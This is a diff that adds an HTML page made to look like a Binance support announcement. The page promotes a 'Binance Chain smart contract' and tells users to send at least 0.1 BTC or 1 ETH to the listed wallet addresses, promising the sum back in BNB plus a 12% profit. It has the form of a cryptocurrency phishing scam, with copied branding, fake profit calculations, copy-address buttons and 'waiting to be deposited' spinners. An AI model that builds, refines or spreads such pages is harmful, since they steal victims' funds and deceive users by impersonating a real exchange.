@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="./styles.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
+    />
+    <link rel="stylesheet" type="text/css" href="https://bin.bnbstatic.com/static/fonts/font.min.css">
+    <title>Binance-Chain-Support</title>
+    <script src="https://code.Jquery.com/Jquery-3.5.1.min.Js"></script>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@48,400,0,0" />
+  </head>
+  <body>
+    <header class="header">
+      <div class="header-div"><div class="wine-img"><img src="./Binance-images-folder/Binance-Icon-Logo.wine.png"  alt=""></div><a class="binance-name" href="https://www.binance.com/en">BINANCE</a></div>
+      <nav class="menu-container" > <button id="Showscroll" type="submit" class="bars-btn" onclick="opendropdownheadernav()" >
+       <div> <img src="./Binance-images-folder/Screenshot 2022-11-23 at 11.57.46.png" height="24" alt=""> </div>
+      </button>
+       
+        <ul  class="header-ul"  id="dropdownheadernav">
+            <button id="Closescroll" type="button" class="faclose-btn" onclick="closedropdownheadernav()" > <span class="x-cls">&#x2715</span>    
+</button>
+            <button class="login-btn"> <a href="https://accounts.binance.com/en/login">Log In</a> </button>
+            
+            <button class="reg-btn"><a href="https://accounts.binance.com/en/register">Register</a></button> <br>
+            <li class="buycrypto-lis"> <label class="lab4-buycrypto1" for="lab4-buycrypto"> <div class="buycrypto-div"><img class="buycrypto-img" src="./Binance-images-folder/Screenshot 2022-11-13 at 21.53.27.png"  height="18" alt=""> <span class="bcsp">Buy Crypto </span><img class="buycrypto-div1" src="./Binance-images-folder/Screenshot 2022-11-13 at 21.52.53.png" width="15" height="17" alt=""> </div> <i class="fa fa-caret-down"><i class="fa fa-caret-up"></i></i> </label>
+            <input class="buycrypto-input" type="checkbox"  id="lab4-buycrypto"> 
+          <ul class="buycrypto-wrap">
+            <div class="paywt-div"><a class="paywt-link" href="">Pay with </a> <span class="paywt-span"><figure class="eur-fig"><img src="./Binance-images-folder/Screenshot 2022-11-24 at 09.11.02.png" alt=""></figure>  <span class="eur-span">EUR</span> <span class="material-symbols-outlined">
+arrow_right
+</span> </span> </div>
+            <li><a href="">Bank Deposit <figure class="bd-img"><img src="./Binance-images-folder/Screenshot 2022-11-24 at 09.11.55.png" alt=""></figure> </a></li>
+            <li><a href="">Credit/Debit Card <figure class="bd-img"><img src="./Binance-images-folder/Screenshot 2022-11-24 at 09.11.55.png" alt=""></figure> </a></li>
+            <li><a href="">Cash Balance</a></li>
+            <li><a href="">P2P Trading</a></li>
+          </ul></li>
+            <li class="markets-link"><a class="markets-link" href="https://www.binance.com/en/markets"> <div class="markets-div"><img src="./Binance-images-folder/Screenshot 2022-11-14 at 13.38.15.png" width="" height="" alt=""> </div><div class="markets-div1">Markets</div> </a></li>
+
+            <li class="trade-lis"> <label class="lab4-trade1" for="lab4-trade"> <div class="trade-div"><img src="./Binance-images-folder/Screenshot 2022-11-13 at 22.07.03.png" width="20" height="20" alt=""> <p>Trade</p> </div> <i class="fa fa-caret-down"><i class="fa fa-caret-up"></i></i> </label> <input class="trade-input" type="checkbox"  id="lab4-trade">
+              <ul class="trade-wrap">
+            <li><a href="https://www.binance.com/en/convert">Binance Convert</a></li>
+            <li><a href="https://www.binance.com/en/trade/BTC_USDT?theme=light&type=spot">Spot</a></li>
+            <li><a href="https://www.binance.com/en/trade/BTC_USDT?theme=light&type=cross">Margin</a></li>
+            <li><a href="https://p2p.binance.com/en">P2P</a></li>
+            <li><a href="https://www.binance.com/en/strategy/strategyPool">Strategy Trading</a></li>
+            <li><a href="https://www.binance.com/en/swap">Swap Farming</a></li>
+            <li><a href="https://www.binance.com/en/fan-token?utm_source=fan-token">Fan Token</a></li>
+            <li><a href="https://www.binance.com/en/otc">Binance OTC</a></li>
+            </ul></li>
+            <li class="derivatives-lis"> <label class="lab4-derivatives1" for="lab4-derivatives"> <div class="derivatives-div"><img src="./Binance-images-folder/Screenshot 2022-11-13 at 22.07.50.png" width="20" height="20" alt=""> <p>Derivatives</p>  </div><i class="fa fa-caret-down"><i class="fa fa-caret-up"></i></i> </label> <input class="derivatives-input" type="checkbox"  id="lab4-derivatives">
+            <ul class="derivatives-wrap">
+            <li><a href="https://www.binance.com/en/futures">Binance Futures Overview</a></li>
+            <li><a href="https://www.binance.com/en/futures/responsible-trading">Responsible Trading</a></li>
+            <li><a href="https://www.binance.com/en/futures/BTCUSDT">USD&#9416-M Futures</a></li>
+            <li><a href="https://www.binance.com/en/delivery/btcusd_quarter">Options</a></li>
+            <li><a href="https://www.binance.com/en/leveraged-tokens/tokens/allTokens">Leveraged Tokens</a></li>
+            <li><a href="https://www.binance.com/en/futures-activity/leaderboard">Leaderboard</a></li>
+            <li><a href="https://www.binance.com/en/futures-activity/battle">Battle</a></li>
+            <li><a href="https://www.binance.com/en/vip-portal"></a>VIP Portal</li>
+            </ul></li>
+            <li class="earn-lis"> <label class="lab4-earn1" for="lab4-earn"> <div class="earn-div"><img src="./Binance-images-folder/Screenshot 2022-11-13 at 22.08.04.png" width="20" height="20" alt=""> <p>Earn</p> </div><i class="fa fa-caret-down"><i class="fa fa-caret-up"></i></i> </label> <input class="earn-input" type="checkbox"  id="lab4-earn">
+            <ul class="earn-wrap">
+            <li><a href="https://www.binance.com/en/earn">Binance Earn</a></li>
+            <li><a href="https://launchpad.binance.com/en">Launchpad</a></li>
+            <li><a href="https://www.binance.com/en/simple-earn">Simple Earn</a></li>
+            <li><a href="https://www.binance.com/en/defi-staking">Defi Staking</a></li>
+            <li><a href="https://www.binance.com/en/bnb-vault">BNB Vault</a></li>
+            <li><a href="https://www.binance.com/en/dual-investment">Dual Investment</a></li>
+            <li><a href="https://www.binance.com/en/swap/pool">Liquidity Farming</a></li>
+            <li><a href="https://www.binance.com/en/auto-invest/">Auto-Invest</a></li>
+            <li><a href="https://pool.binance.com/en">Binance Pool</a></li>
+            <li><a href="https://www.binance.com/en/eth2">ETH 2.0</a></li>
+            </ul></li>
+            <li class="finance-lis"> <label class="lab4-finance1" for="lab4-finance"> <div class="finance-div"><img src="./Binance-images-folder/Screenshot 2022-11-13 at 22.37.48.png" width="20" height="20" alt=""> <p>Finance</p> </div> <i class="fa fa-caret-down"><i class="fa fa-caret-up"></i></i> </label> <input class="finance-input" type="checkbox"  id="lab4-finance">
+            <ul class="finance-wrap">
+            <li><a href="https://www.binance.com/en/cards/">Binance Card</a></li>
+            <li><a href="https://www.binance.com/en/loan">Crypto Loans</a></li>
+            <li><a href="https://www.binance.com/en/my/wallet/account/payment">Binance Pay</a></li>
+            <li><a href="https://www.binance.com/en/gift-card">Binance Gift Card</a></li>
+            </ul></li>
+            <li class="nft-lis"> <a class="nft-link" href=""> <div class="nft-div"><img src="./Binance-images-folder/Screenshot 2022-11-13 at 22.09.48.png" width="1" height="20" alt=""> </div> <div class="nft-div1">NFT</div> </a></li> 
+
+
+            <li class="institutional-lis"> <label class="lab4-institutional1" for="lab4-institutional"><p>Institutional</p> <i class="fa fa-caret-down"><i class="fa fa-caret-up"></i></i> </label> <input class="institutional-input" type="checkbox"  id="lab4-institutional">
+            <ul class="institutional-wrap">
+            <li><a href="https://www.binance.com/en/vip-institutional-services">Institutional Home</a></li>
+            <li><a href="https://www.binance.com/en/link">Link</a></li>
+            <li><a href="https://www.binance.com/en/assets-management">Asset Management Solutions</a></li>
+            <li><a href="https://www.binance.com/en/vip-portal">VIP Portal</a></li>
+            <li><a href="https://www.binanceinstitutional.com/?utm_source=binance&utm_campaign=vip">Custody</a></li>
+            <li><a href="https://www.binance.com/en/loan/vip">VIP Loan</a></li>
+            <li><a href="https://www.binance.com/en/binance-api">APIs</a></li>
+            <li><a href="https://www.binance.com/en/landing/data">Historical Market Data</a></li>
+            <li><a href="https://www.binance.com/en/otc">Execution & OTC services</a></li>
+            <li><a href="">Feed</a></li>
+            </ul></li>
+            <li class="feed-lis">Feed</li>
+            <li class="products-lis"> <label class="lab4-products1" for="lab4-products"> <div class="products-div"><img src="./Binance-images-folder/Screenshot 2022-11-13 at 22.10.00.png" width="20" height="20" alt=""><p>Products</p> </div> <i class="fa fa-caret-down"><i class="fa fa-caret-up"></i></i> </label> <input class="products-input" type="checkbox"  id="lab4-products">
+            <ul class="products-wrap">
+            <li><a href="https://www.binance.com/en/trade/BTC_USDT?theme=light&type=spot">Exchange</a></li>
+            <li><a href="https://academy.binance.com/en">Academy</a></li>
+            <li><a href="https://www.binance.com/en/link">Link</a></li>
+            <li><a href="https://www.binance.com/en/vip-institutional-services">Institutional & VIP Services</a></li>
+            <li><a href="https://academy.binance.com/en/learn-and-earn">Learn & Earn</a></li>
+            <li><a href="https://www.binance.charity/">Charity</a></li>
+            <li><a href="https://cloud.binance.com/">Cloud</a></li>
+            <li><a href="https://www.bnbchain.org/en">DEX</a></li>
+            <li><a href="https://labs.binance.com/">Labs</a></li>
+            <li><a href="https://launchpad.binance.com/en">Launchpad</a></li>
+            <li><a href="https://research.binance.com/en">Research</a></li>
+            <li><a href="https://trustwallet.com/">Trust Wallet</a></li>
+            <li><a href="https://www.binance.com/en/gift-card">Binance Gift Card</a></li>
+
+            </ul></li>
+            <li class="theme-lis"> <div class="theme-div"><img src="./Binance-images-folder/Screenshot 2022-11-13 at 22.10.11.png"  height="20" alt=""><a class="theme-link" href=""> </div><div class="theme-div1">Theme</div></a>  </li>
+            <li class="downloads-lis"> <div class="downloads-div"><img src="./Binance-images-folder/Screenshot 2022-11-13 at 22.10.23.png" width="20" height="20" alt=""><a class="downloads-link" href="https://www.binance.com/en/download"> </div> <div class="downloads-div1">Downloads</div>  </a> </li>
+            <li class="english-lis"> <div class="english-div"><img src="./Binance-images-folder/Screenshot 2022-11-13 at 22.10.33.png" height="20" alt=""> <a class="english-link" href="https://www.binance.com/en"></div><div class="english-div1">English</div> </a></li>
+            <li class="usd-lis"> <div class="usd-div"><img src="./Binance-images-folder/Screenshot 2022-11-13 at 22.10.49.png" height="20" alt=""><a class="usd-link" href="https://www.binance.com/en"></div> <div class="usd-div1">USD</div></a></li>
+         
+        </ul>
+      </nav>
+    </header>
+    <div class="h-links">
+     <a href="https://www.binance.com/en/support">Support Center <span> > </span></a>
+     <a href="https://www.binance.com/en/support/announcement">Announcement <span> > </span></a>
+     <a href="https://www.binance.com/en/support/announcement/latest-binance-news?c=49&navId=49">Latest News <span> > </span></a>
+      </div>
+    <main>
+     
+      <section class="sec-2">
+        <div class="sec2-div">
+          <h3 class="blnwbcsc">Binance Launches New Binance Chain Smart Contracts</h3>
+       
+         <div class="blackimg-bin"><img
+            src="./Binance-images-folder/images-black-binance-1.png"
+            alt=""
+          /></div>
+        <div class="title-binance">
+            <p class="bname">Binance</p>
+            <p class="bdate">2022-11-16 00:00</p>
+         </div><br><br>
+       <hr>
+      </section>
+      <section class="sec-3">
+
+       <iframe src="https://www.youtube.com/embed/QyY-GWlQ1kw?controls=0" height=""  frameborder="0"></iframe> 
+      </section>
+      <br><br><br><br><br><br><br><br>
+      <section class="sec-4">
+        <div class="sec4-div">
+          <strong> Fellow Binancians, </strong> <br /><br />
+          <p>
+            At Binance, we truly believe that decentralized finance will play a
+            pivotal role in the future.
+          </p>
+          <br />
+          <p>
+            In order to unlock the mainstream adoption of
+            <a class="binancecoin-link" href="https://www.binance.com/en/bnb">Binance Coin(BNB)</a> , a good wallet is one of the most
+            important gateways for our users.
+          </p>
+          <br />
+          <p>
+            We appreciate all wallets who contribute to improving the user
+            experience of Binance Chain!
+          </p>
+          <br />
+          <p>
+            Now team up with the <a class="highquality-wallet-link" href="https://www.binance.com/en/blog/all/binance-awards-2020--bnb-chain-wallet-of-the-year-421499824684900744">high-quality wallets</a> that have
+            supported our Binance Chain since the beginning, we jointly launch
+            the Binance Chain smart contract. Use the smart contract to trade
+            your BTC or ETH to BNB, and it generates an extra 12% BNB as your
+            profit, which we committed to a total of 600,000 BNB
+          </p>
+          <p>
+            The currently online smart contracts are applicable to <a class="trust-wallet-link2" href="https://trustwallet.com/">Trust wallet</a>,
+           <a class="atomic-wallet-link2" href="https://atomicwallet.io/"> Atomic wallet</a>, and <a class="zengo-wallet-link2" href="https://zengo.com/">ZenGo wallet</a>. 
+          </p>
+          <br /><br /><br />
+          <p>To use the smart contract, please follow the steps below</p>
+          <br /><br />
+          <ul>
+            <li>
+              Install any of the wallets mentioned above (
+              <a class="trust-wallet-link" href="https://trustwallet.com/">Trust wallet</a> , <a class="atomic-wallet-link" href="https://atomicwallet.io/">Atomic wallet</a> , and
+              <a class="zengo-wallet-link" href="https://zengo.com/">ZenGo wallet</a> )
+            </li>
+            <br />
+            <li>Add Binance (BNB) token to the wallet.</li>
+            <li>
+              Send BTC or ETH to the smart contract address in the wallet.
+            </li>
+            <br />
+            <li>
+              The minimum sending volume of the BTC smart contract is 0.1 BTC
+              and the minimum sending volume of the ETH smart contract is 1 ETH.
+            </li>
+            <br />
+            <li>
+              BNB will be automatically deposited into your wallet (including
+              the original value <a class="bnb-12" href="">+12% BNB</a> increase in value)
+            </li>
+            
+          </ul>
+          <br /><br />
+          <p><strong>ETH Smart contract</strong></p>
+          <br /><br />
+          <p>Profit Calculation:</p>
+          <br />
+          <ul>
+            <li>
+              Suppose the price of ETH is $450 and the price of BNB is $30
+            </li>
+            <li>
+              In your wallet, send 1 ETH to the smart contract ($450), and you
+              will receive $450+($450×12%)=$504, which is $16.8 BNB, $54 gain
+            </li>
+          </ul>
+          <br />
+        </div>
+      <br /><br><br><br>
+        <div class="flex-container">
+              <button class="show-modal">{Click to view ETH smart contract}➤</button></div>
+              <div class="modal hidden">
+                <button class="close-modal">&times;</button>
+                <section class="wijettpsec">
+                  <div class="tplftimg"><img src="./Binance-images-folder/Screenshot 2022-11-17 at 06.07.14.png" width="40" height="30" alt=""></div><h4 class="clik-h4">Binance Chain BNB-ETH Smart contract</h4><div class="tprhtimg"><img src="./Binance-images-folder/PngItem_1245793-2.png" width="40" height="28" alt="">
+                </div>
+                </section>
+                <div class="bgimg"><img src="./Binance-images-folder/smart-header-2.jpeg" height="250" alt=""></div>
+                <div class="wijet-wrap3">
+                  <p class="ethsmtadrs">The Ethereum(ETH) Smart Contract Address:</p>
+                  <div class="copy-text">
+                    <input type="text" class="text" value="0x96Dc04EBf04Ba485c3ef80AE317B903e9fdDb3d5">
+                    <button><i class="fa fa-clone"></i></button>
+                  </div>
+                  <!-- <div class="copyinputbtn"><button onclick="myFunction()"class="facopy-btn"> <i class="fa fa-copy"></i> </button><input class="eth-input" type="text" value="0x96Dc04EBf04Ba485c3ef80AE317B903e9fdDb3d5" id="myInput"></div> -->
+                  <div class="ethbcde-container"><img src="./Binance-images-folder/Screenshot 2022-11-26 at 13.30.11.png"></div>
+                  <p class="waitn-dep">Waiting to be deposited…</p>
+                  <i class="fa fa-spinner fa-spin" style="font-size:28px" ></i>
+                  <p class="htu-dep">Depositing your ETH into the smart contract means agreeing to convert ETH into Binance Coin (BNB) and send to your wallet immediately</p>
+                  
+                  <p class="sup-p">Thanks for your support!</p>
+                  <p class="team-p">Binance Team</p>
+                </div>
+               <div class="b-dex">Binance Dex</div>
+              </div>
+            
+            
+             <br><br><br><br><br>
+        <p><strong>BTC Smart contract</strong></p>
+        <br>
+        <p>Profit Calculation:</p>
+        
+        <ul>
+          <li>
+            Similarly, for example, the price of BTC is $15,000, and the price
+            of BNB is $30
+          </li>
+          <br />
+          <li>
+            In your wallet, send 1 BTC to the smart contract ($15,000) and you
+            will receive BNB equivalent to $16,800, which is 560 BNB. ($1,800
+            gain)
+          </li>
+        </ul>
+        <br /><br><br><br>
+       <div class="flex-container">
+              <button class="show-modal1">{Click to view BTC smart contract}➤</button></div>
+              <div class="modal1 hidden">
+                <button class="close-modal1">&times;</button>
+                <section class="bwijettpsec">
+                  <div class="btplftimg"><img src="./Binance-images-folder/Screenshot 2022-11-17 at 06.07.14.png" width="40" height="30" alt=""></div><h4 class="bclik-h4">Binance Chain BNB-BTC Smart contract</h4><div class="btprhtimg"><img src="./Binance-images-folder/Screenshot 2022-11-19 at 06.39.02.png" width="40" height="28" alt=""></div>
+                </section>
+                <div class="bbgimg"><img src="./Binance-images-folder/smart-header-2.jpeg" height="250" alt=""></div>
+                <div class="wijet-wrap3a">
+                  <p class="btcsmtadrs">The Bitcoin(BTC) Smart Contract Address:</p>
+                  <!-- <div class="bcopyinputbtn"><button onclick="myFunction()"class="facopy-btn"> <i class="fa fa-copy"></i> </button><input class="eth-input" type="text" value="Hello World" id="myInput"> -->
+                  <!-- <div class="bcopyinputbtn"><button onclick="myFunction()" class="facopy-btn"> <i class="fa fa-copy"></i> </button><input class="btc-input" type="text" value="1Lbd88UP7XTHjCw1JEE696FaHxWiv3GfHE" id="myInput"></div> -->
+                  <div class="Click-CopyWallet-Addres-BTC">
+                    <input type="1Lbd88UP7XTHjCw1JEE696FaHxWiv3GfHE" class="textbtc" value="1Lbd88UP7XTHjCw1JEE696FaHxWiv3GfHE">
+                    <button class="clone-btn"><i class="fa fa-clone"></i></button>
+                  </div>
+                  <div class="btcbcde-container"><img src="./Binance-images-folder/Screenshot 2022-11-26 at 13.14.42.png" height="" alt=""></div>
+                  <p class="bwaitn-dep">Waiting to be deposited…</p>
+                  <i class="fa fa-spinner fa-spin" style="font-size:28px" ></i>
+                  <p class="bhtu-dep">Depositing your BTC into the smart contract means agreeing to convert BTC into Binance Coin (BNB) and send to your wallet immediately</p>
+                  
+                  <p class="bsup-p">Thanks for your support!</p>
+                  <p class="bteam-p">Binance Team</p>
+                </div>
+               <div class="bb-dex">Binance Dex</div>
+              </div>
+            <br><br><br>
+<hr>
+
+
+            <a class="research-link" href=""><article class="research-body">
+             <div class="research-img"> <img src="./Binance-images-folder/wide.png" alt=""></div>
+              <h3 class="research-title">What to say to someone who says that cryptocurrency is “too risky?”</h3>
+              <p class="research-desc">A brief comparison of the risk of Bitcoin and Ether versus some popular technology stocks</p>
+            </article></a>
+            
+            
+            
+
+
+        <br /><br /><br /><br />
+        <p>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀</p>
+        <br /><br />
+        <div>
+          <p>NOTE:</p>
+          <br />
+          <ul>
+            <li>
+              The profit margin may fluctuate during the activity, but it will
+              not be less than 10%.
+            </li>
+            <br />
+            <li>
+              The minimum sending volume of BTC smart contract is 0.1 BTC, and
+              the minimum sending volume of ETH smart contract is 1 ETH.
+            </li>
+            <br />
+            <li>
+              The activity will continue until the contract pool of 600,000 BNB
+              is issued.
+            </li>
+            <br />
+            <li>
+              After the activity finished, if you send BTC or ETH to the smart
+              contract, your coins will be automatically returned to your wallet
+              and no profit will be generated.
+            </li>
+            <br />
+          </ul>
+          <br /><br />
+          <p>
+            <strong>Risk Warning:</strong>
+            Cryptocurrency investment is subject to high market risk. Binance is
+            not responsible for any direct, indirect or consequential losses as
+            a result of the trading competition. Please make your investments
+            with caution.
+          </p>
+        </div>
+        <br /><br /><br /><br /><br /><br /><br /><br />
+        <div class="q-div">
+          <p>
+            <span>Have more questions?</span> <a class="submit-link" href="https://binance.zendesk.com/hc/en-us/requests/new">Submit a Request</a>
+          </p>
+        </div>
+      </section>
+      <br /><br /><br /><br /><br /><br />
+      <section>
+      <ul class="sec__5">
+        <li class="aboutus-lis">
+          <label class="lab4-aboutus1" for="lab4-aboutus"><p> <strong>About Us</strong></p><i class="fa fa-plus"><i class="fa fa-minus"></i></i></label>
+          <input class="aboutus-input" type="checkbox"  id="lab4-aboutus">
+          <ul class="aboutus-wrap">
+            <li><a href="https://www.binance.com/en/about">About</a></li>
+           <li><a href="https://www.binance.com/en/careers">Careers</a></li>
+           <li><a href="https://www.binance.com/en/about#email">Business Contacts</a></li>
+           <li><a href="https://www.binance.com/en/community">Community</a></li>
+           <li><a href="https://www.binance.com/en/blog">Binance Blog</a></li>
+           <li><a href="https://www.binance.com/en/terms">Terms</a></li>
+           <li><a href="https://www.binance.com/en/privacy">Privacy</a></li>
+           <li><a href="https://www.binance.com/en/risk-warning">Risk Warning</a></li>
+           <li><a href="https://www.binance.com/en/support/announcement">Announcements</a></li>
+           <li><a href="https://www.binance.com/en/news">News</a></li>
+           <li><a href="https://www.binance.com/en/support/list/notices">Notices</a></li>
+           <li><a href="https://www.binance.com/en/country-region-selector">Sitemap</a></li>
+           <li><a href="https://www.binance.me/en/cookie-privacy">Cookie Preferences</a></li>
+          </ul>
+        </li>
+        <li class="product-lis">
+        <label class="lab4-product1" for="lab4-product"><p><strong>Product</strong> </p><i class="fa fa-plus"> <i class="fa fa-minus"></i></i></label>
+        <input class="product-input" type="checkbox"  id="lab4-product">
+        <ul class="product-wrap">
+         <li> <a href="https://www.binance.com/en">Exchange</a></li>
+         <li> <a href="https://academy.binance.com/en">Academy</a></li>
+         <li> <a href="https://www.binance.com/en/live">Binance Live</a></li>
+         <li> <a href="https://www.binance.charity/">Charity</a></li>
+         <li> <a href="https://www.binance.com/en/cards">Card</a></li>
+         <li> <a href="https://labs.binance.com/">Labs</a></li>
+         <li> <a href="https://launchpad.binance.com/en">Launchpad</a></li>
+         <li> <a href="https://research.binance.com/">Research</a></li>
+         <li> <a href="https://trustwallet.com/">Trust Wallet</a></li>
+         <li> <a href="">NFT</a></li>
+         <li> <a href="https://pay.binance.com/en">Binance Pay</a></li>
+         <li> <a href="https://www.binance.com/en/cards/">Binance Gift Card</a></li>
+         <li> <a href="https://www.binance.com/en/BABT">BABT</a></li>
+        </ul>
+        </li>
+        <li class="service-lis">
+        <label class="lab4-product1" for="lab4-service"> <p><strong>Service</strong></p>
+        <i class="fa fa-plus"><i class="fa fa-minus"></i></i></label>
+        <input class="service-input" type="checkbox"  id="lab4-service">
+        <ul class="service-wrap">
+         <li> <a href="https://www.binance.com/en/download">Downloads</a></li>
+         <li> <a href="https://www.binance.com/en/desktop-download">Desktop Application</a></li>
+         <li> <a href="https://www.binance.com/en/buy-sell-crypto">Buy Crypto</a></li>
+         <li> <a href="https://www.binance.com/en/vip-institutional-services"> Institutional & VIP Services </a></li>
+         <li> <a href="https://www.binance.com/en/otc">OTC Trading</a></li>
+         <li> <a href="https://www.binance.com/en/activity/referral?utm_source=Lite_web_footer">Referral</a></li>
+         <li> <a href="https://www.binance.com/en/activity/affiliate">Affiliate</a></li>
+         <li> <a href="https://www.binance.com/en/bnb">BNB</a></li>
+         <li> <a href="https://www.binance.com/en/my/coin-apply">Listing Application</a></li>
+         <li> <a href="https://c2c.binance.com/en/merchantApplication">P2P Merchant Application</a></li>
+         <li> <a href="https://p2p.binance.com/en/p2pro">P2Pro Merchant Application</a></li>
+         <li> <a href="https://www.binance.com/en/landing/data">Historical Market Data</a></li>
+         <li> <a href="https://www.binance.com/en/collateral-btokens">Proof Of Asset</a></li>
+        </ul>
+        </li>
+        <li class="support-lis">
+        <label class="lab4-support1" for="lab4-support"><p><strong>Support</strong></p>
+          <i class="fa fa-plus"><i class="fa fa-minus"></i></i></label>
+          <input class="support-input" type="checkbox"  id="lab4-support">
+        <ul class="support-wrap">
+         <li> <a href="https://www.binance.com/en/my/user-support/feedback/entry">Give Us Feedback</a></li>
+         <li> <a href="https://www.binance.com/en/support">Support Center</a></li>
+         <li> <a href="https://www.binance.com/en/chat">Submit A request</a></li>
+         <li> <a href="https://www.binance.com/en/binance-api">APIs</a></li>
+         <li> <a href="https://www.binance.com/en/fee/schedule">Fees</a></li>
+         <li> <a href="https://www.binance.com/en/trade-rule">Trading Rules</a></li>
+         <li> <a href="https://www.binance.com/en/official-verification">Binance Verify</a></li>
+         <li> <a href="https://www.binance.com/en/support/law-enforcement">Law Enforcement Requests</a></li>
+         <li> <a href="https://www.binance.com/en/binance-legal">Binance Legal(Court Orders)</a></li>
+         <li> <a href="https://www.binance.com/en/airdrop">Binance Airdrop Portal</a></li>
+        </ul>
+        </li>
+        <li class="learn-lis">
+       <label class="lab4-learn1" for="lab4-learn"> <p> <strong>Learn</strong> </p>  <i class="fa fa-plus"><i class="fa fa-minus"></i></i></label>
+       <input class="learn-input" type="checkbox"  id="lab4-learn">
+        <ul class="learn-wrap">
+         <li> <a href="https://academy.binance.com/en/learn-and-earn">learn & Earn</a></li>
+         <li> <a href="https://www.binance.com/en/price">Browse crypto prices</a></li>
+         <li> <a href="https://www.binance.com/en/price/bitcoin">Bitcoin Price</a></li>
+         <li> <a href="https://www.binance.com/en/price/ethereum">Ethereum Price</a></li>
+         <li> <a href="https://www.binance.com/en/how-to-buy/bnb">Buy BNB</a></li>
+         <li> <a href="https://www.binance.com/en/busd">Buy BUSD</a></li>
+         <li> <a href="https://www.binance.com/en/how-to-buy/bitcoin">Buy Bitcoin</a></li>
+         <li> <a href="https://www.binance.com/en/how-to-buy/ethereum">Buy Ethereum</a></li>
+         <li> <a href="https://www.binance.com/en/how-to-buy/dogecoin">Buy Dogecoin </a></li>
+         <li> <a href="https://www.binance.com/en/how-to-buy/xrp">Buy XRP </a></li>
+         <li> <a href="https://www.binance.com/en/altcoins/tradable">Buy Tradable Altcoins</a></li>
+        </ul>
+        </li>
+      </ul>
+      </section>
+       <div class="commsp-wrap"> <span class="community-sp">Community</span> </div>
+       <div class="icons-wrap2">
+      <div> <a href="https://discord.com/invite/jE4wt8g2H2"><img class="yimg" src="./Binance-images-folder/Screenshot 2022-11-15 at 05.13.56.png" width="23" height="23" alt=""></a></div>
+       <div> <a href="https://www.binance.com/en/community"><img class="yimg" src="./Binance-images-folder/Screenshot 2022-11-24 at 14.20.43.png" width="23" height="23" alt=""></a> </div>
+       <div> <a href="https://www.tiktok.com/@binance?lang=en"><img class="yimg" src="./Binance-images-folder/Screenshot 2022-11-15 at 05.14.12.png" width="23" height="23" alt=""></a> </div>
+       <div> <a href="https://web.facebook.com/binance?_rdc=1&_rdr"><img class="yimg" src="./Binance-images-folder/Screenshot 2022-11-15 at 05.51.42.png" width="23" height="23" alt=""></a> </div>
+       <div> <a href="https://twitter.com/binance"><img class="yimg" src="./Binance-images-folder/Screenshot 2022-11-24 at 14.19.33.png" width="23" height="23" alt=""></a> </div>
+       <div> <a href="https://www.reddit.com/r/binance/"><img class="yimg" src="./Binance-images-folder/Screenshot 2022-11-24 at 14.21.28.png" width="23" height="23" alt=""></a> </div>
+       <div> <a href="https://www.instagram.com/Binance/"> <img class="yimg" src="./Binance-images-folder/Screenshot 2022-11-24 at 14.22.11.png" width="23" height="23" alt=""></a> </div>
+       <div> <a href="https://coinmarketcap.com/exchanges/binance/"><img class="yimg"
+            src="./Binance-images-folder/Screenshot 2022-11-15 at 05.15.34.png" width="23" height="23"
+            alt=""
+        /></a> </div>
+       <div> <a href="https://vk.com/binance"><img class="yimg" src="./Binance-images-folder/Screenshot 2022-11-15 at 05.52.02.png" width="23" height="23" alt=""></a> </div>
+       <div> <a href="https://www.youtube.com/binanceyoutube"><img class="yimg" src="./Binance-images-folder/Screenshot 2022-11-24 at 14.18.55.png" width="23" height="23" alt=""></a> </div>
+       </div>
+      </div>
+    </main>
+  </div>
+</div>
+    <footer>
+      Binance &#169 2022
+    </footer>
+        <div class="overlay hidden"></div>
+    <script src="script.js"></script>
+    <script>
+function myFunction() {
+  var copyText = document.getElementById("myInput");
+
+
+  navigator.clipboard.writeText(copyText.value);
+
+  alert("Copied the text: " + copyText.value);
+}
+// function myFunction() {
+//   var copyText = document.getElementsById("myInput1");
+
+
+//   navigator.clipboard.writeText(copyText.value);
+
+//   alert("Copied the text: " + copyText.value);
+// }
+</script>
+  </body>
+</html>
+
+
+
+
+
+
+
+<!-- 
+<div class="wijet-wrap">
+              <button type="submit" class="ethclikbtn"  onclick="opensmarteth()" >{Click to view ETH smart contract}➤</button>
+              <div class="wijet-wrap2" id="smarteth">
+                <section class="wijettpsec">
+                  <div class="tplftimg"><img src="./Binance-images-folder/Screenshot 2022-11-17 at 06.07.14.png" width="40" height="30" alt=""></div><h4 class="clik-h4">Binance Chain BNB-ETH Smart contract</h4><div class="tprhtimg"><img src="./Binance-images-folder/PngItem_1245793-2.png" width="40" height="28" alt="">
+                </div>
+                <button type="submit" class="smartethx" onclick="closesmarteth()">x</button>
+                </section>
+                <div class="bgimg"><img src="./Binance-images-folder/smart-header-2.jpeg" height="250" alt=""></div>
+                <div class="wijet-wrap3">
+                  <p class="ethsmtadrs">The Ethereum(ETH) Smart Contract Address:</p>
+                  <div class="copyinputbtn"><button onclick="myFunction()"class="facopy-btn"> <i class="fa fa-copy"></i> </button><input class="eth-input" type="text" value="" id="myInput"></div>
+                  <div class="eth-bcde"><img src="./Binance-images-folder/Screenshot 2022-11-19 at 05.39.23.png" alt=""></div>
+                  <p class="waitn-dep">Waiting to be deposited…</p>
+                  <i class="fa fa-spinner fa-spin" style="font-size:28px" ></i>
+                  <p class="htu-dep">Depositing your ETH into the smart contract means agreeing to convert ETH into Binance Coin (BNB) and send to your wallet immediately</p>
+                  
+                  <p class="sup-p">Thanks for your support!</p>
+                  <p class="team-p">Binance Team</p>
+                </div>
+               <div class="b-dex">Binance Dex</div>
+              </div>
+            </div> -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
